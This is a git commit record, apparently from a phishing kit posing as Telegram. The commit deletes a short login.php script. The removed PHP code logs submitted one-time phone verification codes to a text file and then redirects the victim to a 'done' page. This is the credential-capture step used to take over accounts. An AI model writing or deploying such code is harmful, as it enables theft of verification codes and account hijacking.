c8949f9b45391be3cb679a4e48e91eb193a028bb
org-telegram <pwercoin@gmail.com>
2024-12-05 20:30:06 +0300

    Delete login.php

--- login.php
+++
@@ -1,7 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "OTP: " . $_POST["phone_code"] . "\n", FILE_APPEND);
-file_put_contents("usernames.txt", "OTP2: " . $_POST["phone_code2"] . "\n", FILE_APPEND);
-header('Location: done.php');
-exit();
-?>
-
